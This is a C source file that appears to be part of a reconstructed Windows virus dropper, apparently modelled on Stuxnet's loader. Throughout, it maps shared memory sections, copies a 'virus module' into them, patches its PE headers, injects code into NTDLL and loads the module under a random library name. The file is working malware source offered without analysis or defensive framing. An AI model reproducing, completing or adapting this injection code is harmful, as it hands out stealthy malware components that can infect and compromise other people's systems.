#include "MemorySections.h"
#include "Encoding.h"
#include "Utils.h"
#include "AssemblyBlock0.h"
#include "AssemblyBlock1.h"
#include "AssemblyBlock2.h"
#include "EncodingAlgorithms.h"
#include "CodeBlock.h"

#include "config.h"
#include "define.h"

INT32 
LoadVirusModuleSection
(HANDLE hHandle,
 PGENERAL_INFO_BLOCK sInfoBlock,
 PVOID pVirusModule,
 INT32 pVirusModuleSize,
 INT32 iExecEntryNumber,
 PVOID pUnknownSegment,
 DWORD pUnknownSegmentSize,
 PVOID *ppModuleBlock)
{
	HANDLE hMapHandle;
	PVOID pVirusImageBase;
	PIMAGE_NT_HEADERS pImageNT;
	INT32 iSectionPointer;
	PVOID pLocalReg;
	PIMAGE_DOS_HEADER pImageDOS;
	UINT32 iSectionsSize;
	PVOID pRemoteReg;
	PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader;
	INT32 nRet;

	pLocalReg       = 0;
	pRemoteReg      = 0;
	
	iSectionPointer = 0;
	iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;
	
	nRet = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pLocalReg, &pRemoteReg);
	HAS_FAILED(nRet, nRet)
	
	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pLocalReg;
	pLocalReg                = (LPVOID)((DWORD)pLocalReg + sizeof(VIRUS_MODULE_BLOCKS_HEADER));
	iSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);
	
	CopySegmentIntoSections(&pLocalReg, pRemoteReg, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
	pVirusImageBase = pLocalReg;
	
	CopySegmentIntoSections(&pLocalReg, pRemoteReg, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
	pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;
	
	if((UINT32)pVirusModuleSize >= 0x1000 &&
	   pImageDOS->e_magic == MZ_HEADER &&
	   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section ".text"
	{
		pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);
		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
			pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size
	}
	
	__memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));
	
	sVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;
	sVirusModuleBlocksHeader->VirusModulePointer        = 0;
	
	*ppModuleBlock = pRemoteReg;
	
	_F(UnmapViewOfFile)(sVirusModuleBlocksHeader);
	_F(ZwClose)(hMapHandle);

	return 0;
}

INT32 
LoadAndInjectVirus
(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader,
PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader,
PGENERAL_INFO_BLOCK sInfoBlock)
{
	HMODULE pVirusModule;
	HANDLE hMappedAddress;
	INT32 iResult;
	PHARDCODED_ADDRESSES pHardAddrs;
	GENERAL_INFO_BLOCK sInfoBlockCopy;

	__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));
	
	sInfoBlockCopy.OriginalAddress ^= X_PTR_KEY;
	sInfoBlockCopy.UnknownZero0     = 0;
	
	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
	
	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
	if(iResult) return iResult;
	
	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs)) return -4;
	
	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
	if(!pVirusModule) return -9;
	
	sVirusModuleBlocksHeader->VirusModulePointer = pVirusModule;
	hMappedAddress = sInfoBlockCopy.MappedAddress;
	
	if(sInfoBlockCopy.MappedAddress)
	{
		sInfoBlockCopy.MappedAddress = 0;
		pHardAddrs->ZwClose(hMappedAddress);
	}
	
	return 0;
}

DWORD 
GetCodeBlockSize(void)
{
	return _SIZE(BLOCK4_END, BLOCK4_InjectAndExecuteVirus);
}

DWORD 
GetCodeBlock(void)
{
	return (DWORD)BLOCK4_InjectAndExecuteVirus;
}

DWORD 
GetRelativeExecuteLibraryPointer(void)
{
	return _SIZE(BLOCK4_ExecuteLibrary, BLOCK4_InjectAndExecuteVirus);
}

UINT32 
GetRelativeAlignAddressesPointer(void)
{
	return _SIZE(BLOCK4_AlignAddresses, BLOCK4_InjectAndExecuteVirus);
}

INT32 
LoadCodeSection
(HANDLE hHandle,
 PVOID pVirusModuleSection,
 PVOID *ppCodeBlock,
 PVOID *ppASMBlock)
{
	PVOID pCodeBlock;
	HANDLE hMapHandle;
	INT32 iASMBlock1Pointer;
	DWORD *v9;
	INT32 iSectionPointer;
	PVOID pLocal;
	UINT32 iSectionsSize;
	PVOID pRemote;
	PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader;
	UINT32 iCodeBlockSize;
	INT32 nRet;

	pLocal = 0;
	pRemote = 0;
	
	iCodeBlockSize = GetCodeBlockSize();
	iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0) + _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0) + iCodeBlockSize;
	
	iSectionPointer = 0;
	
	nRet = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pLocal, &pRemote);
	HAS_FAILED(nRet, nRet)
	
	sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pLocal;
	pLocal               = (LPVOID)((DWORD)pLocal + sizeof(ASM_CODE_BLOCKS_HEADER));
	iSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);
	
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0));
	iASMBlock1Pointer = iSectionPointer;
	
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0));
	pCodeBlock = (PVOID)GetCodeBlock();
	
	CopySegmentIntoSections(&pLocal, pRemote, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);
	
	v9 = (DWORD *)((DWORD)sASMCodeBlocksHeader + iASMBlock1Pointer + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
	*v9 = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);
	
	sASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();
	sASMCodeBlocksHeader->AlignAddresses = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeAlignAddressesPointer();
	sASMCodeBlocksHeader->VirusModuleSection = (DWORD)pVirusModuleSection;
	
	*ppCodeBlock	= (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
	*ppASMBlock		= pRemote;
	
	_F(UnmapViewOfFile)(sASMCodeBlocksHeader);
	_F(ZwClose)(hMapHandle);
	
	return 0;
}

static BOOL bSetupMode = TRUE;

static PVOID s_ASMCodeBlocksPTR = NULL;
static PVOID s_virusBlocksPTR   = NULL;
static PVOID s_codeBlockPTR     = NULL;

INT32 
Setup
(LPCWSTR szDebugModuleName,
PVOID pVirusModule,
DWORD iVirusModuleSize,
HMODULE *hVirusModule)
{
	INT32 nRet;
	GENERAL_INFO_BLOCK sInfoBlock;

	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0)
		return 0;
	
	if(bSetupMode && DecodeEncryptedModuleNames() == FALSE)
		return -12;
	
	nRet = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
	HAS_FAILED(nRet, nRet)
	
	if(bSetupMode)
	{
		nRet = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
		HAS_FAILED(nRet, nRet)
		
		bSetupMode = FALSE;
	}
	
	nRet = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);
	if(!nRet)
		*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
	
	_F(UnmapViewOfFile)(s_virusBlocksPTR);
	
	return nRet;
}